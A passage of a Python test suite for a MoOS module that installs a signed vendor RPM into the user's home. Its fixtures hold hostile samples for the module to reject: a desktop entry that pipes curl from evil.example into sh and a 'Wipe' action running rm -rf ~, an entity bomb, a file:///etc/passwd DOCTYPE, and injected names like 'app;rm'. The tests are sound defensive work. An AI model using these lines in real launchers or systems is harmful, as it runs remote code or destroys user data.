#!/usr/bin/env python3
"""Gate: Mo Store can run a publisher's own signed Linux package from the person's home —
the newest build, a pinned download, the publisher's signature, only the app's folder, and a
launcher MoOS writes — with no administrator rights and nothing from the package executed.

WHY THIS EXISTS

The official ChatGPT desktop app for Linux exists only as a signed package in its publisher's
repository. Layering it would stop the image following its signed origin, so
`system_files/usr/lib/moos/moos_vendor_rpm.py` unpacks it into the home instead. Every step is a
place where a wrong answer installs the wrong thing or writes where it must not:

  * the version order must be rpm's own (epochs, `~` before a release, `^` after it), or an
    older build is installed as "newest" — the full rpm table is here;
  * the metadata must not send the download to another host, nor over http, nor be a bomb;
  * the download must be exactly the size and SHA-256 the metadata promised;
  * the signature must be the CATALOGUE's key, which the image already trusts — the real rpm 6
    outputs for OK, NOKEY and BAD (captured on the station 2026-10-14) are judged here, along
    with a wrong key, an unprovable 8-digit key id, a weak algorithm and a missing payload digest;
  * the payload reader is fed hostile archives built for real: absolute and `..` names, devices,
    links that leave the app folder, control characters, writing through a link, a bomb, a
    truncated payload, junk after the trailer, the >4 GiB format, and a producer that fails;
  * a launcher MoOS did not write is never overwritten, and remove() touches only what carries
    MoOS's marker — never through a link;
  * a failed update leaves the version that worked in place.

No network, no rpm tools and no desktop are needed: the repository is served from bytes through a
stub opener, the image's tools are replaced by recorded outputs, and HOME is private.
"""

from __future__ import annotations

import ast
import base64
import bz2
import email.message
import gzip
import hashlib
import io
import json
import lzma
import os
from pathlib import Path
import re
import shutil
import stat
import struct
import subprocess
import sys
import tempfile
import unittest
import urllib.error
import urllib.request

ROOT = Path(__file__).resolve().parents[1]
MODULE = ROOT / "system_files/usr/lib/moos/moos_vendor_rpm.py"
sys.path.insert(0, str(MODULE.parent))
import moos_vendor_rpm as vendor  # noqa: E402

FPR = "3BFA0E4AE8B8CC16A2D9BA684A3B4A566C4660E4"
OTHER_FPR = "36F612DCF27F7D1A48A835E4DBFCF71C6D9F90A6"
BASE = "https://packages.example.com/linux/rpm/x86_64"
ENTRY = {
    "repo": "https://packages.example.com/linux/rpm/$basearch",
    "package": "app",
    "key_fingerprint": FPR,
    "install_root": "/usr/lib/app",
    "exec": "App",
    "icon": "/usr/share/pixmaps/app.png",
    "desktop": "/usr/share/applications/app.desktop",
    "wm_class": "App",
    "schemes": ["appx"],
}
# The tests serve their own repository, reviewed for them the way a real vendor is: listed, with
# the one key that may sign it. What the module SHIPS is kept aside and asserted on its own.
SHIPPED_REPOSITORIES = dict(vendor.TRUSTED_REPOSITORIES)
vendor.TRUSTED_REPOSITORIES[ENTRY["repo"]] = FPR
CHATGPT_REPO = "https://persistent.oaistatic.com/codex-app-prod/linux/rpm/$basearch"

# rpm 6.0.2 on the station, 2026-10-14, against the real ChatGPT package (path shortened).
CHECKSIG_OK = """{path}:
    Header OpenPGP V4 RSA/SHA512 signature, key fingerprint: 3bfa0e4ae8b8cc16a2d9ba684a3b4a566c4660e4: OK
    Header SHA256 digest: OK
    Payload SHA256 digest: OK
"""
CHECKSIG_NOKEY = """{path}:
    Header OpenPGP V4 RSA/SHA512 signature, key ID 4a3b4a566c4660e4: NOKEY
    Header SHA256 digest: OK
    Payload SHA256 digest: OK
"""
CHECKSIG_BAD_PAYLOAD = """{path}:
    Header OpenPGP V4 RSA/SHA512 signature, key fingerprint: 3bfa0e4ae8b8cc16a2d9ba684a3b4a566c4660e4: OK
    Header SHA256 digest: OK
    Payload SHA3-256 digest: NOTFOUND
    Payload SHA3-256 ALT digest: NOTFOUND
    Payload SHA512 digest: NOTFOUND
    Payload SHA512 ALT digest: NOTFOUND
    Payload SHA256 ALT digest: BAD (Expected a1ce90854b321dc1f6de718ca4c47deb0a869b3d95099a41ef88541f75452cd5 != f26c3b1bfd3190fcb3f512e260882b212afe85cee4de9e754035a0d15039141b)
    Payload SHA256 digest: BAD (Expected 88b01ed7ffedc434476b072647f1e98b1c6367c90cef83e0451854c5bc7e4fae != f26c3b1bfd3190fcb3f512e260882b212afe85cee4de9e754035a0d15039141b)
    Legacy OpenPGP DSA signature: NOTFOUND
    Legacy OpenPGP RSA signature: NOTFOUND
    Legacy MD5 digest: NOTFOUND
"""
CHECKSIG_BAD_HEADER = """{path}:
    Header OpenPGP V4 RSA/SHA512 signature, key fingerprint: 3bfa0e4ae8b8cc16a2d9ba684a3b4a566c4660e4: BAD
    Header SHA3-256 digest: NOTFOUND
    Header SHA256 digest: BAD (Expected 9d0cee12ad912e99a98a63db09d67d3d2a4cb3a6136e4eff1c3827333acca6db != 733dfc3d845a0d39eef951e1704d77b96e2df8692aeb70ee10a5a4da99096afe)
    Header SHA1 digest: NOTFOUND
    Payload SHA256 digest: OK
    Legacy MD5 digest: NOTFOUND
"""
# `rpm -q gpg-pubkey --qf '%{name}-%{version}-%{release} %{packager}\n'` on the station (rpm 6 names
# each key by its whole fingerprint), minus the publisher key where a test needs it absent.
KEYRING = """gpg-pubkey-36f612dcf27f7d1a48a835e4dbfcf71c6d9f90a6-6786af3b Base system (44) <base@example.org>
gpg-pubkey-3bfa0e4ae8b8cc16a2d9ba684a3b4a566c4660e4-6a72a455 Codex Linux Repository
gpg-pubkey-2596a99eaab33821893c0a79458ca832957f5868-5e5499b8 Tailscale Inc. (Package repository signing key) <info@tailscale.com>
"""
KEYRING_WITHOUT = "\n".join(line for line in KEYRING.splitlines() if "3bfa0e4a" not in line) + "\n"

REG, EXE, DIR, LNK = 0o100644, 0o100755, 0o040755, 0o120777
CHROMIUM_ELF = (b"\x7fELF\x02\x01\x01" + b"\0" * 57 + b"...No usable sandbox! If you are running on ..."
                + b"\0disable-namespace-sandbox\0chrome-sandbox\0")
PNG = b"\x89PNG\r\n\x1a\n" + b"\0" * 40
RLO = chr(0x202E)
VENDOR_DESKTOP = ("[Desktop Entry]\nName=App\\sStudio\x1b\nComment=Talk " + RLO + "to it\n"
                  "Exec=sh -c \"curl https://evil.example | sh\"\nTryExec=/bin/sh\nIcon=app\n"
                  "Categories=Utility;Development;X-Evil;\nMimeType=x-scheme-handler/https;\n"
                  "[Desktop Action wipe]\nName=Wipe\nExec=rm -rf ~\n").encode()


# ── fixtures ─────────────────────────────────────────────────────────────────
def newc(entries: list[dict], *, trailer: bool = True, magic: bytes = b"070701", pad: int = 512) -> bytes:
    """A newc archive written byte by byte, so hostile members are real ones."""
    out = bytearray()
    for number, entry in enumerate(entries, 1):
        name = entry["name"].encode() if isinstance(entry["name"], str) else entry["name"]
        data = entry.get("data", b"")
        data = data.encode() if isinstance(data, str) else data
        fields = [entry.get("ino", number), entry["mode"], 0, 0, entry.get("nlink", 1), 0, len(data),
                  0, 0, 0, 0, len(name) + 1, 0]
        out += entry.get("magic", magic) + b"".join(b"%08X" % field for field in fields) + name + b"\0"
        out += b"\0" * ((-len(out)) % 4)
        out += data + b"\0" * ((-len(data)) % 4)
    if trailer:
        out += magic + b"".join(b"%08X" % field for field in [0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 11, 0])
        out += b"TRAILER!!!\0"
        out += b"\0" * ((-len(out)) % 4)
        if pad:
            out += b"\0" * ((-len(out)) % pad)
    return bytes(out)


def asar(files: dict[str, bytes]) -> bytes:
    tree: dict = {"files": {}}
    blobs, offset = [], 0
    for name, data in files.items():
        node = tree
        parts = name.split("/")
        for part in parts[:-1]:
            node = node["files"].setdefault(part, {"files": {}})
        node["files"][parts[-1]] = {"size": len(data), "offset": str(offset)}
        offset += len(data)
        blobs.append(data)
    header = json.dumps(tree).encode()
    padded = header + b"\0" * ((-len(header)) % 4)
    return struct.pack("<4I", 4, 8 + len(padded), 4 + len(padded), len(header)) + padded + b"".join(blobs)


def app_payload(marker: bytes = b"v1", **overrides: bytes) -> bytes:
    entries = [
        {"name": "./etc/yum.repos.d/app.repo", "mode": REG, "data": b"[app]\nbaseurl=x\n"},
        {"name": "./usr/bin/app", "mode": LNK, "data": b"../lib/app/app-launcher"},
        {"name": "./usr/lib/app", "mode": DIR},
        {"name": "./usr/lib/app/App", "mode": EXE, "data": overrides.get("app", CHROMIUM_ELF) + marker},
        {"name": "./usr/lib/app/app-launcher", "mode": EXE,
         "data": overrides.get("launcher", b'#!/bin/sh\nexec "$(dirname "$0")/App" "$@"\n')},
        {"name": "./usr/lib/app/chrome-sandbox", "mode": 0o104755, "data": b"\x7fELF helper"},
        {"name": "./usr/lib/app/resources", "mode": DIR},
        {"name": "./usr/lib/app/resources/app.asar", "mode": REG,
         "data": asar({"main.js": overrides.get("main", b"app.whenReady().then(open)"),
                       "node_modules/x/index.js": b"spawn(chrome, ['--no-sandbox'])"})},
        {"name": "./usr/share/applications/app.desktop", "mode": REG, "data": VENDOR_DESKTOP},
        {"name": "./usr/share/pixmaps/app.png", "mode": REG, "data": PNG},
    ]
    return newc(entries)


def compress(data: bytes, kind: str) -> tuple[bytes, str]:
    if kind == "gz":
        return gzip.compress(data), ".gz"
    if kind == "xz":
        return lzma.compress(data), ".xz"
    if kind == "bz2":
        return bz2.compress(data), ".bz2"
    if kind == "zst":
        from compression import zstd  # type: ignore[import-not-found]
        return zstd.compress(data), ".zst"
    return data, ""


def package_xml(package: dict) -> str:
    location = f'<location href="{package["href"]}"'
    if package.get("xml_base"):
        location += f' xml:base="{package["xml_base"]}"'
    location += "/>"
    size = package["size"]
    return (f'<package type="{package.get("type", "rpm")}"><name>{package["name"]}</name>'
            f'<arch>{package.get("arch", "x86_64")}</arch>'
            f'<version epoch="{package.get("epoch", "0")}" ver="{package["ver"]}" rel="{package["rel"]}"/>'
            f'<checksum type="{package.get("checksum_type", "sha256")}" pkgid="YES">{package["sha256"]}</checksum>'
            f'<summary>An app</summary><packager></packager>'
            f'<size package="{size}" installed="{package.get("installed", size * 3)}" '
            f'archive="{package.get("archive", size * 3)}"/>{location}'
            f'<format><rpm:license>Proprietary</rpm:license><rpm:provides>'
            f'<rpm:entry name="{package["name"]}" flags="EQ" epoch="9" ver="999" rel="1"/></rpm:provides>'
            f'<file>/usr/bin/{package["name"]}</file></format></package>')


def primary_xml(packages: list[dict], prologue: str = "") -> bytes:
    body = "".join(package_xml(package) for package in packages)
    return (f'<?xml version="1.0" encoding="UTF-8"?>{prologue}<metadata xmlns="http://linux.duke.edu/metadata/common" '
            f'xmlns:rpm="http://linux.duke.edu/metadata/rpm" packages="{len(packages)}">{body}</metadata>').encode()


def repomd_xml(href: str, blob: bytes, opened: bytes, *, kind: str = "sha256", open_digest: str | None = None,
               digest: str | None = None) -> bytes:
    digest = digest or (hashlib.new(kind, blob).hexdigest() if kind in ("sha256", "sha512") else "ab" * 20)
    open_digest = open_digest or hashlib.sha256(opened).hexdigest()
    return (f'<?xml version="1.0" encoding="UTF-8"?><repomd xmlns="http://linux.duke.edu/metadata/repo" '
            f'xmlns:rpm="http://linux.duke.edu/metadata/rpm"><revision>1791934269</revision>'
            f'<data type="filelists"><checksum type="sha256">{"0" * 64}</checksum>'
            f'<location href="repodata/0-filelists.xml.gz"/></data>'
            f'<data type="primary"><checksum type="{kind}">{digest}</checksum>'
            f'<open-checksum type="sha256">{open_digest}</open-checksum><location href="{href}"/>'
            f'<timestamp>1791934269</timestamp><size>{len(blob)}</size><open-size>{len(opened)}</open-size></data>'
            f'</repomd>').encode()


def package(name: str, ver: str, rel: str = "1", *, content: bytes = b"rpm", **extra) -> dict:
    return {"name": name, "ver": ver, "rel": rel, "sha256": hashlib.sha256(content).hexdigest(), "size": len(content),
            "href": f"{name}-{ver}-{rel}.{extra.get('arch', 'x86_64')}.rpm", **extra}


def repo_routes(packages: list[dict], *, compression: str = "gz", base: str = BASE, opened: bytes | None = None,
                **repomd_options) -> dict[str, bytes]:
    opened = opened if opened is not None else primary_xml(packages)
    blob, suffix = compress(opened, compression)
    href = f"repodata/{hashlib.sha256(blob).hexdigest()}-primary.xml{suffix}"
    return {f"{base}/repodata/repomd.xml": repomd_xml(href, blob, opened, **repomd_options), f"{base}/{href}": blob}


class Response:
    def __init__(self, url: str, body: bytes, *, final_url: str | None = None, status: int = 200,
                 length: int | None = None):
        self._body = io.BytesIO(body)
        self.url = final_url or url
        self.status = status
        self.headers = email.message.Message()
        self.headers["Content-Length"] = str(len(body) if length is None else length)
        self.closed = False

    def read(self, count: int = -1) -> bytes:
        return self._body.read(count)

    def geturl(self) -> str:
        return self.url

    def close(self) -> None:
        self.closed = True


class Opener:
    """Serves a repository from bytes; records every URL asked for and every response handed out."""

    def __init__(self, routes: dict):
        self.routes = routes
        self.requests: list[str] = []
        self.responses: list[Response] = []

    def open(self, request: urllib.request.Request, timeout: float | None = None) -> Response:
        url = request.full_url
        self.requests.append(url)
        if url not in self.routes:
            raise urllib.error.HTTPError(url, 404, "Not Found", email.message.Message(), io.BytesIO())
        route = self.routes[url]
        response = route if isinstance(route, Response) else Response(url, route)
        self.responses.append(response)
        return response


class Tools:
    """The image's rpm tools, replaced by their recorded answers."""

    def __init__(self, checksig: str = CHECKSIG_OK, status: int = 0, keys: str = KEYRING,
                 header: tuple = ("app", "0", "2.0", "1", "x86_64", "cpio")):
        self.checksig, self.status, self.keys, self.header = checksig, status, keys, header
        self.calls: list[tuple[list[str], dict]] = []

    def __call__(self, argv: list[str], **kwargs) -> subprocess.CompletedProcess:
        self.calls.append((argv, kwargs))
        if argv[:3] == [vendor.RPM, "-q", "gpg-pubkey"]:
            return subprocess.CompletedProcess(argv, 0, self.keys.encode(), b"")
        if argv[0] == vendor.RPMKEYS:
            return subprocess.CompletedProcess(argv, self.status, self.checksig.format(path=argv[-1]).encode(), b"")
        if argv[:2] == [vendor.RPM, "-qp"]:
            return subprocess.CompletedProcess(argv, 0, ("\n".join(self.header) + "\n").encode(), b"")
        raise AssertionError(f"unexpected tool: {argv}")


class Home(unittest.TestCase):
    """A private HOME: nothing here may touch the account running the gate."""

    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.base = Path(self.tmp.name)
        self.home = self.base / "home"
        self.home.mkdir()
        self.outside = self.base / "OUTSIDE"
        self.outside.mkdir()
        (self.outside / "canary").write_text("untouched")
        keys = ("HOME", "XDG_DATA_HOME", "XDG_CACHE_HOME", "PATH", "DBUS_SESSION_BUS_ADDRESS", "WAYLAND_DISPLAY",
                "DISPLAY")
        self.saved = {key: os.environ.get(key) for key in keys}
        os.environ["HOME"] = str(self.home)
        for key in keys[1:]:
            os.environ.pop(key, None)
        os.environ["PATH"] = str(self.base / "empty-bin")   # no menu tools: never rebuild a real menu
        self.saved_constants = {name: getattr(vendor, name) for name in
                                ("MAX_TREE_FILES", "MAX_TREE_BYTES", "RATIO_FLOOR", "MAX_RATIO", "MAX_REPOMD_BYTES",
                                 "RPM2CPIO", "SPACE_MARGIN")}

    def tearDown(self) -> None:
        for name, value in self.saved_constants.items():
            setattr(vendor, name, value)
        for key, value in self.saved.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        self.tmp.cleanup()

    def assertCode(self, code: str, call, *args, **kwargs):
        with self.assertRaises(vendor.VendorError) as caught:
            call(*args, **kwargs)
        self.assertEqual(caught.exception.code, code, caught.exception.detail)
        return caught.exception

    def assertOutsideUntouched(self) -> None:
        self.assertEqual(sorted(p.name for p in self.outside.iterdir()), ["canary"])
        self.assertEqual((self.outside / "canary").read_text(), "untouched")

    def proc_sys(self, max_userns: str = "62503", clone: str | None = None, apparmor: str | None = None) -> Path:
        root = self.base / f"proc-sys-{max_userns}-{clone}-{apparmor}"
        (root / "user").mkdir(parents=True, exist_ok=True)
        (root / "user/max_user_namespaces").write_text(max_userns + "\n")
        (root / "kernel").mkdir(exist_ok=True)
        if clone is not None:
            (root / "kernel/unprivileged_userns_clone").write_text(clone + "\n")
        if apparmor is not None:
            (root / "kernel/apparmor_restrict_unprivileged_userns").write_text(apparmor + "\n")
        return root


# ── version order ────────────────────────────────────────────────────────────
# rpm's own table (tests/rpmvercmp.at), including the cases it documents as oddities.
RPM_TABLE = """
1.0 1.0 0|1.0 2.0 -1|2.0 1.0 1|2.0.1 2.0.1 0|2.0 2.0.1 -1|2.0.1 2.0 1|2.0.1a 2.0.1a 0|2.0.1a 2.0.1 1
2.0.1 2.0.1a -1|5.5p1 5.5p1 0|5.5p1 5.5p2 -1|5.5p2 5.5p1 1|5.5p10 5.5p10 0|5.5p1 5.5p10 -1|5.5p10 5.5p1 1
10xyz 10.1xyz -1|10.1xyz 10xyz 1|xyz10 xyz10 0|xyz10 xyz10.1 -1|xyz10.1 xyz10 1|xyz.4 xyz.4 0|xyz.4 8 -1
8 xyz.4 1|xyz.4 2 -1|2 xyz.4 1|5.5p2 5.6p1 -1|5.6p1 5.5p2 1|5.6p1 6.5p1 -1|6.5p1 5.6p1 1|6.0.rc1 6.0 1
6.0 6.0.rc1 -1|10b2 10a1 1|10a2 10b2 -1|1.0aa 1.0aa 0|1.0a 1.0aa -1|1.0aa 1.0a 1|10.0001 10.0001 0
10.0001 10.1 0|10.1 10.0001 0|10.0001 10.0039 -1|10.0039 10.0001 1|4.999.9 5.0 -1|5.0 4.999.9 1
20101121 20101121 0|20101121 20101122 -1|20101122 20101121 1|2_0 2_0 0|2.0 2_0 0|2_0 2.0 0|a a 0|a+ a+ 0
a+ a_ 0|a_ a+ 0|+a +a 0|+a _a 0|_a +a 0|+_ +_ 0|_+ +_ 0|_+ _+ 0|+ _ 0|_ + 0|1.0~rc1 1.0~rc1 0|1.0~rc1 1.0 -1
1.0 1.0~rc1 1|1.0~rc1 1.0~rc2 -1|1.0~rc2 1.0~rc1 1|1.0~rc1~git123 1.0~rc1~git123 0|1.0~rc1~git123 1.0~rc1 -1
1.0~rc1 1.0~rc1~git123 1|1.0^ 1.0^ 0|1.0^ 1.0 1|1.0 1.0^ -1|1.0^git1 1.0^git1 0|1.0^git1 1.0 1|1.0 1.0^git1 -1
1.0^git1 1.0^git2 -1|1.0^git2 1.0^git1 1|1.0^git1 1.01 -1|1.01 1.0^git1 1|1.0^20160101 1.0^20160101 0
1.0^20160101 1.0.1 -1|1.0.1 1.0^20160101 1|1.0^20160101^git1 1.0^20160101^git1 0
1.0^20160102 1.0^20160101^git1 1|1.0^20160101^git1 1.0^20160102 -1|1.0~rc1^git1 1.0~rc1^git1 0
1.0~rc1^git1 1.0~rc1 1|1.0~rc1 1.0~rc1^git1 -1|1.0^git1~pre 1.0^git1~pre 0|1.0^git1 1.0^git1~pre 1
1.0^git1~pre 1.0^git1 -1|1b.fc17 1b.fc17 0|1b.fc17 1.fc17 -1|1.fc17 1b.fc17 1|1g.fc17 1g.fc17 0
1g.fc17 1.fc17 1|1.fc17 1g.fc17 -1
"""


class VersionOrder(unittest.TestCase):
    def test_rpm_table(self):
        cases = [item.split() for item in RPM_TABLE.replace("\n", "|").split("|") if item.strip()]
        self.assertEqual(len(cases), 97)
        for a, b, expected in cases:
            with self.subTest(a=a, b=b):
                self.assertEqual(vendor.rpmvercmp(a, b), int(expected))
                self.assertEqual(vendor.rpmvercmp(b, a), -int(expected))

    def test_non_ascii_is_a_separator_as_in_rpm(self):
        alpha, beta = chr(0x3B1), chr(0x3B2)
        self.assertEqual(vendor.rpmvercmp(f"1.1.{alpha}", f"1.1.{beta}"), 0)
        self.assertEqual(vendor.rpmvercmp(f"1.1.{alpha}{alpha}", f"1.1.{alpha}"), 0)

    def test_epoch_then_version_then_release(self):
        self.assertEqual(vendor.evr_compare("1:1.0-1", "9.9-9"), 1)            # the epoch wins
        self.assertEqual(vendor.evr_compare("0:2.0-1", "2.0-1"), 0)            # no epoch is epoch 0
        self.assertEqual(vendor.evr_compare("2.0-10", "2.0-9"), 1)             # releases are numbers
        self.assertEqual(vendor.evr_compare("2.0~rc1-5", "2.0-1"), -1)         # a pre-release sorts first
        self.assertEqual(vendor.evr_compare("2.0^git1-1", "2.0-9"), 1)         # a snapshot sorts after
        self.assertEqual(vendor.evr_compare({"epoch": 2, "version": "1", "release": "1"}, "1:5-1"), 1)
        self.assertEqual(vendor.evr_compare("10:1-1", "9:1-1"), 1)             # epochs are numbers
        for bad in ("1:2:3-1", "x:1.0-1", "1.0-1-2-", "", "1.0 -1"):
            with self.subTest(bad=bad), self.assertRaises(vendor.VendorError):
                vendor.evr_compare(bad, "1.0-1")


# ── the catalogue entry ──────────────────────────────────────────────────────
class EntryRules(unittest.TestCase):
    def test_the_real_chatgpt_entry_parses(self):
        spec = vendor.parse_entry({
            "repo": "https://persistent.oaistatic.com/codex-app-prod/linux/rpm/$basearch", "package": "chatgpt",
            "key_fingerprint": FPR, "install_root": "/usr/lib/chatgpt", "exec": "ChatGPT",
            "icon": "/usr/share/pixmaps/chatgpt.png", "desktop": "/usr/share/applications/chatgpt.desktop",
            "wm_class": "ChatGPT", "schemes": ["codex"]})
        self.assertEqual(spec.repo_url("aarch64"), "https://persistent.oaistatic.com/codex-app-prod/linux/rpm/aarch64")
        self.assertEqual(spec.key_fingerprint, FPR.lower())

    def test_bad_entries(self):
        bad = {
            "http repo": {"repo": "http://packages.example.com/rpm/$basearch"},
            "no basearch": {"repo": "https://packages.example.com/rpm/x86_64"},
            "two basearch": {"repo": "https://packages.example.com/$basearch/$basearch"},
            "other variable": {"repo": "https://packages.example.com/$releasever/$basearch"},
            "credentials": {"repo": "https://user:pw@packages.example.com/$basearch"},
            "query": {"repo": "https://packages.example.com/$basearch?token=1"},
            "short key": {"key_fingerprint": FPR[-16:]},
            "relative root": {"install_root": "usr/lib/app"},
            "root dotdot": {"install_root": "/usr/lib/../../etc"},
            "root too shallow": {"install_root": "/usr"},
            "root a shared system folder": {"install_root": "/usr/lib"},
            "root /opt itself": {"install_root": "/opt"},
            "root outside usr/opt": {"install_root": "/etc/app"},
            "exec dotdot": {"exec": "../../bin/sh"},
            "exec absolute": {"exec": "/bin/sh"},
            "exec control": {"exec": "App\nExec=evil"},
            "desktop not desktop": {"desktop": "/usr/share/applications/app.sh"},
            "icon kind": {"icon": "/usr/share/pixmaps/app.xpm"},
            "wm class": {"wm_class": "App\nX=1"},
            "scheme http": {"schemes": ["http"]},
            "scheme moos": {"schemes": ["moos"]},
            "scheme shape": {"schemes": ["bad scheme"]},
            "package": {"package": "app;rm"},
        }
        for label, change in bad.items():
            with self.subTest(label), self.assertRaises(vendor.VendorError) as caught:
                vendor.parse_entry({**ENTRY, **change})
            self.assertEqual(caught.exception.code, "bad_entry")

    def test_only_reviewed_repositories_each_with_its_own_key(self):
        self.assertEqual(SHIPPED_REPOSITORIES, {CHATGPT_REPO: FPR})
        cases = {
            "an unlisted repository": {"repo": "https://mirror.example/linux/rpm/$basearch"},
            "a listed repository with another trusted key": {"key_fingerprint": OTHER_FPR},
            "the ChatGPT repository with another trusted key": {"repo": CHATGPT_REPO, "key_fingerprint": OTHER_FPR},
        }
        for label, change in cases.items():
            with self.subTest(label), self.assertRaises(vendor.VendorError) as caught:
                vendor.parse_entry({**ENTRY, **change})
            self.assertEqual(caught.exception.code, "bad_entry")
        self.assertEqual(vendor.parse_entry({**ENTRY, "key_fingerprint": FPR.lower()}).key_fingerprint, FPR.lower())
        self.assertEqual(vendor.parse_entry({**ENTRY, "install_root": "/opt/app"}).install_root, "/opt/app")
        # An Entry built by hand is checked again, never trusted for having the right type.
        forged = vendor.Entry(repo="https://mirror.example/linux/rpm/$basearch", package="app", key_fingerprint=FPR,
                              install_root="/usr/lib/app", exec="App", desktop="/usr/share/applications/app.desktop",
                              wm_class="App")
        with self.assertRaises(vendor.VendorError) as caught:
            vendor.parse_entry(forged)
        self.assertEqual(caught.exception.code, "bad_entry")
        self.assertEqual(vendor.parse_entry(vendor.parse_entry(ENTRY)), vendor.parse_entry(ENTRY))

    def test_the_image_trusts_exactly_the_pinned_key(self):
        """The armoured key build.sh imports must BE the fingerprint the module pins (v4: SHA-1 over
        0x99, a two-byte length and the public-key packet)."""
        armoured = (ROOT / "system_files/etc/pki/rpm-gpg/RPM-GPG-KEY-openai-chatgpt").read_text(encoding="ascii")
        body = armoured.split("\n\n", 1)[1].split("\n=", 1)[0]
        data = base64.b64decode("".join(body.split()))
        first = data[0]
        if first & 0x40:                                    # new packet format
            tag, length_octet = first & 0x3F, data[1]
            if length_octet < 192:
                length, offset = length_octet, 2
            elif length_octet < 224:
                length, offset = ((length_octet - 192) << 8) + data[2] + 192, 3
            else:
                length, offset = int.from_bytes(data[2:6], "big"), 6
        else:                                               # old packet format
            tag, kind = (first >> 2) & 0x0F, first & 0x03
            size = {0: 1, 1: 2, 2: 4}[kind]
            length, offset = int.from_bytes(data[1:1 + size], "big"), 1 + size
        self.assertEqual(tag, 6, "the file must start with a public-key packet")
        packet = data[offset:offset + length]
        self.assertEqual(packet[0], 4, "a version 4 key")
        fingerprint = hashlib.sha1(b"\x99" + len(packet).to_bytes(2, "big") + packet).hexdigest().upper()
        self.assertEqual(fingerprint, SHIPPED_REPOSITORIES[CHATGPT_REPO])
        for build in ("build_files/build.sh", "build_files/build-arm.sh"):
            self.assertIn("rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-openai-chatgpt",
                          (ROOT / build).read_text(encoding="utf-8"))

    def test_architecture(self):
        self.assertIn(vendor.machine_arch(), vendor.SUPPORTED_ARCHES)
        with self.assertRaises(vendor.VendorError) as caught:
            vendor.check_arch("riscv64")
        self.assertEqual(caught.exception.code, "unsupported_arch")


# ── resolve ──────────────────────────────────────────────────────────────────
class Resolve(Home):
    def test_newest_build_by_rpm_order(self):
        packages = [
            package("app", "1.9"), package("app", "2.0~rc1"), package("app", "2.0", "9"), package("app", "2.0", "10"),
            package("app", "2.0^git1", content=b"newest"),
            package("app-beta", "99"),                                  # another name
            package("app", "50", arch="aarch64"),                       # another architecture
            package("app", "60", arch="src", type="rpm"),               # a source package
        ]
        opener = Opener(repo_routes(packages))
        info = vendor.resolve(ENTRY, "x86_64", opener=opener)
        self.assertEqual((info["epoch"], info["version"], info["release"]), (0, "2.0^git1", "1"))
        self.assertEqual(info["url"], f"{BASE}/app-2.0^git1-1.x86_64.rpm")
        self.assertEqual(info["sha256"], hashlib.sha256(b"newest").hexdigest())
        self.assertEqual(info["size"], 6)
        self.assertEqual((info["installed_size"], info["archive_size"]), (18, 18))
        self.assertEqual(info["repo"], BASE)
        self.assertEqual(opener.requests[0], f"{BASE}/repodata/repomd.xml")
        self.assertTrue(all(url.startswith("https://packages.example.com/") for url in opener.requests))
        self.assertTrue(all(response.closed for response in opener.responses))

    def test_epoch_beats_version(self):
        packages = [package("app", "9.9"), package("app", "0.5", epoch="1", content=b"epoch")]
        info = vendor.resolve(ENTRY, "x86_64", opener=Opener(repo_routes(packages)))
        self.assertEqual((info["epoch"], info["version"], info["evr"]), (1, "0.5", "1:0.5-1"))

    def test_every_compression_the_metadata_may_use(self):
        kinds = ["gz", "xz", "bz2", "plain"]
        try:
            from compression import zstd  # type: ignore[import-not-found]  # noqa: F401
            kinds.append("zst")
        except ImportError:
            pass
        for kind in kinds:
            with self.subTest(kind=kind):
                info = vendor.resolve(ENTRY, "x86_64", opener=Opener(repo_routes([package("app", "3.1")], compression=kind)))
                self.assertEqual(info["version"], "3.1")

    def test_download_on_another_host_is_refused(self):
        cases = {
            "absolute": {"href": "https://evil.example/app.rpm"},
            "scheme relative": {"href": "//evil.example/app.rpm"},
            "plain http": {"href": "http://packages.example.com/linux/rpm/x86_64/app.rpm"},
            "xml base": {"xml_base": "https://evil.example/mirror/"},
            "other port": {"href": "https://packages.example.com:8443/app.rpm"},
        }
        for label, change in cases.items():
            with self.subTest(label):
                routes = repo_routes([{**package("app", "2.0"), **change}])
                self.assertCode("foreign_host", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))

    def test_package_list_must_match_the_index(self):
        routes = repo_routes([package("app", "2.0")], digest="0" * 64)
        self.assertCode("metadata_digest_mismatch", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))
        routes = repo_routes([package("app", "2.0")], open_digest="1" * 64)
        self.assertCode("metadata_digest_mismatch", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))

    def test_weak_checksums_are_refused(self):
        routes = repo_routes([package("app", "2.0")], kind="sha")
        self.assertCode("metadata_invalid", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))
        routes = repo_routes([{**package("app", "2.0"), "checksum_type": "sha1", "sha256": "ab" * 20}])
        self.assertCode("metadata_invalid", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))

    def test_entity_declarations_are_refused(self):
        bomb = ('<!DOCTYPE metadata [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
                '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>')
        routes = repo_routes([package("app", "2.0")], opened=primary_xml([package("app", "2.0")], prologue=bomb))
        self.assertCode("metadata_invalid", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))
        external = '<!DOCTYPE metadata SYSTEM "file:///etc/passwd">'
        routes = repo_routes([package("app", "2.0")], opened=primary_xml([package("app", "2.0")], prologue=external))
        self.assertCode("metadata_invalid", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))

    def test_oversize_metadata(self):
        routes = repo_routes([package("app", "2.0")])
        vendor.MAX_REPOMD_BYTES = 100
        self.assertCode("metadata_too_large", vendor.resolve, ENTRY, "x86_64", opener=Opener(routes))
        vendor.MAX_REPOMD_BYTES = self.saved_constants["MAX_REPOMD_BYTES"]
        index_url = f"{BASE}/repodata/repomd.xml"
        routes[index_url] = Response(index_url, routes[index_url], length=50 * 1024 ** 2)   # announced, not sent
        opener = Opener(routes)
        self.assertCode("metadata_too_large", vendor.resolve, ENTRY, "x86_64", opener=opener)
        self.assertTrue(opener.responses[0].closed)

    def test_package_not_found(self):
        routes = repo_routes([package("other", "2.0"), package("app", "2.0", arch="aarch64")])
